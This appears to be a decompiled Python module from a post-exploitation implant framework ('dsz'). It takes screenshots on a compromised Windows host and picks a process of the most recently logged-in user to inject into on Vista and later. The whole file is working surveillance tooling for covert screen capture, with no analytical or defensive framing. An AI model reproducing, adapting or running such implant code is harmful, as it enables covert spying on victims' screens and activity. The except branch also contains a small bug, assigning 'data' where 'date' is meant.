# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _Screenshot.py
import dsz
import dsz.lp
import dsz.version
import sys

def main():
    dsz.control.echo.Off()
    dsz.script.data.Start('Screenshot')
    result = True
    params = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_Screenshot.txt')
    if len(params) == 0:
        return False
    pid = _getPid()
    resolution = 'default'
    format = 'default'
    hWnd = '0'
    extraInfo = ''
    if params.has_key('res'):
        resolution = params['res'][0]
    if params.has_key('format'):
        format = params['format'][0]
    if params.has_key('wnd'):
        hWnd = params['wnd'][0]
    if params.has_key('force'):
        extraInfo = extraInfo + ' -force'
    dsz.control.echo.On()
    if not dsz.cmd.Run('windows -screenshot %s %s %s -id %d%s' % (resolution, format, hWnd, pid, extraInfo), dsz.RUN_FLAG_RECORD):
        result = False
    dsz.control.echo.Off()
    dsz.script.data.End()
    dsz.script.data.Store()
    return result


def _getPid():
    bestName = ''
    bestTime = '00:00:00'
    bestDate = '0000-00-00'
    if not dsz.version.checks.windows.IsVistaOrGreater():
        dsz.ui.Echo('Pre-Vista -- Non-injection methods should work\n', dsz.GOOD)
        return 0
    if not dsz.cmd.Run('currentusers', dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('Failed to get list of current users.  Attempting non-injection method\n', dsz.WARNING)
        return 0
    users = dsz.cmd.data.Get('user', dsz.TYPE_OBJECT)
    for user in users:
        name = dsz.cmd.data.ObjectGet(user, 'name', dsz.TYPE_STRING)[0]
        try:
            time = dsz.cmd.data.ObjectGet(user, 'logintime', dsz.TYPE_STRING)[0]
            date = dsz.cmd.data.ObjectGet(user, 'logindate', dsz.TYPE_STRING)[0]
        except:
            time = '00:00:00'
            data = '0000-00-00'

        if time > bestTime and date >= bestDate:
            bestName = name
            bestTime = time
            bestDate = date

    if not dsz.cmd.Run('processes -list', dsz.RUN_FLAG_RECORD):
        dsz.ui.Echo('Failed to find get process list.  Attempting non-injection method\n', dsz.WARNING)
        return 0
    processitems = dsz.cmd.data.Get('initialprocesslistitem::processitem', dsz.TYPE_OBJECT)
    for processitem in processitems:
        user = dsz.cmd.data.ObjectGet(processitem, 'user', dsz.TYPE_STRING)[0]
        if user.find(bestName) > -1:
            return dsz.cmd.data.ObjectGet(processitem, 'id', dsz.TYPE_INT)[0]

    dsz.ui.Echo('Failed to find a process belonging to ' + bestName + ', attempting non-injection method\n', dsz.WARNING)
    return 0


if __name__ == '__main__':
    if main() != True:
        sys.exit(-1)